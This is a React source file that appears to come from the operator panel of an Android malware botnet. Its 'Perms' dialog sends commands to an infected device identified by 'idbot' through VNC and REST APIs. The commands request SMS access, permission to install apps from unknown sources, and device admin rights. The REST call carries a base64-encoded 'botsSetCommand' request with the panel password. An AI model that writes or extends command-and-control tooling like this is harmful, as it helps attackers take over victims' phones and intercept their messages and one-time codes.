import React, { useState, useEffect, useRef } from 'react'
import SettingsContext from 'src/settings';
import NextLink from 'next/link';
import { Dialog, Box, FormControl,InputLabel, Switch, Select, MenuItem, Tooltip,ListItemAvatar, Avatar, DialogTitle, SvgIcon, DialogContent, Typography, Button, Grid, Item, Paper, List, ListItem, ListItemIcon, ListItemText, Stack} from '@mui/material';
import XCircleIcon from '@heroicons/react/24/solid/XCircleIcon';
import UserIcon from '@heroicons/react/24/solid/UserCircleIcon';
import Globe from '@heroicons/react/24/solid/GlobeEuropeAfricaIcon';
import Battery from '@heroicons/react/24/solid/Battery100Icon';
import { func } from 'prop-types';
import axios from "axios";
import $ from 'jquery';
import { Svg } from "react-svg";
import cheerio from "cheerio";

import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faWifi, faXmarkSquare, faMobile, faUser, faUserAltSlash, faClockRotateLeft, faCommentSlash, faKeyboard, faKey, faBug, faB, faEye, faEyeSlash, faUniversalAccess, faCommentSms, faBugSlash, faCalendarDays, faSms, faAddressBook, faMobileAndroid, faMobileScreen, faMobileAlt, faMobileAndroidAlt, faRectangleList, faArrowsRotate, faTrashCan, faPaperPlane, faLink, faTowerCell, faUnlock, faQuestion, faCoffee, faCloudDownload, faListCheck } from '@fortawesome/free-solid-svg-icons';
import { borderRadius } from '@mui/system';
import { toast } from 'react-toastify';

import 'react-toastify/dist/ReactToastify.css';

import TextField from '@mui/material/TextField';

import Notification from '../Notification/Notification';


export default function Perms(props) {

    const { openPopup, setOpenPopup, idbot} = props;
    const [data, setdata] = useState('');

    const SendPermReq = (command) => {
      let commandreq = {
        "id": idbot,
        "command": command,
        "data" : {}
      };
      sendCommand(commandreq);
    }

    const sendCommand = (commandreq) => {
      let request = $.ajax({
        type: 'POST',
        url: SettingsContext.vncApiUrl + "/api",
        data: JSON.stringify(commandreq)
    });
    }

    function SendCommandRestapi(command) {
      let request = $.ajax({
          type: 'POST',
          url: SettingsContext.restApiUrl,
          data: {
              'params': new Buffer(
                  '{"' + 
                  'request":"botsSetCommand",' + 
                  '"idbot":"' + idbot + '",' + 
                  '"command":"' + new Buffer('{"name":"' + command + '"}').toString('base64') + '"' + 
                  ',"password":"' + SettingsContext.password + ' "}').toString('base64')
          }
      });
  }

    const Shortcut = ({ combo, action }) => {
      return (
        <Card sx={{ minWidth: 275, m: 2, bgcolor: 'primary.main', color: 'white' }}>
          <CardContent>
            <Typography variant="h5" component="div">
              {combo}
            </Typography>
            <Typography variant="body2">
              {action}
            </Typography>
          </CardContent>
        </Card>
      );
    };
    return (
        
        <Dialog open={openPopup} onClose={() => setOpenPopup(false)} maxWidth="md">
            <DialogContent dividers>
                    <div style={{ display: "flex", justifyContent: "space-between"}}>

                    <Box
                    bgcolor="primary.main"
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    marginRight={2}
                    alignItems="center"
                    display="flex"
                    height={45}
                    width={220}
                >
                    <SvgIcon fontSize="medium">
                          <FontAwesomeIcon icon={faListCheck}/>
                        </SvgIcon>
                        <Typography ml={1} variant='h6' color="primary.contrastText" >Perms</Typography>
                        
                    </Box>

                    <Button
                        onClick={()=>{setOpenPopup(false)}}>
                        <FontAwesomeIcon icon={faXmarkSquare} size="2x"/>
                    </Button>
                    </div>
                    <center><Stack mt={5} direction="row" spacing={2}>
                    <Tooltip title="Request sms access">
                      <Button variant="contained" onClick={() => {SendPermReq("sms_perm"); toast.success("Send command to get sms permissions")}} sx={{borderRadius: '20%', height: 50, width: 50}} color="primary">
                        <FontAwesomeIcon icon={faSms} size={'2x'} />
                      </Button>
                      </Tooltip>
                      <Tooltip title="Request permission to install other apps">
                      <Button variant="contained" onClick={() => {SendPermReq("install_from_unknown"); toast.success("Send command to get install from unknown sources perm")}}  sx={{borderRadius: '20%', height: 50, width: 50}} color="primary">
                        <FontAwesomeIcon icon={faCloudDownload} size={'2x'} />
                      </Button>              
                      </Tooltip>
                      <Tooltip title="Request admin access (takes ~1min)">
                      <Button variant="contained" onClick={() => {SendCommandRestapi("startAdmin"); toast.success("Send command to get install from unknown sources perm")}}  sx={{borderRadius: '20%', height: 50, width: 50}} color="primary">
                        <FontAwesomeIcon icon={faUser} size={'2x'} />
                      </Button>           
                      </Tooltip>
                    </Stack></center>
                    
                  
            </DialogContent>
        </Dialog>
    )
}
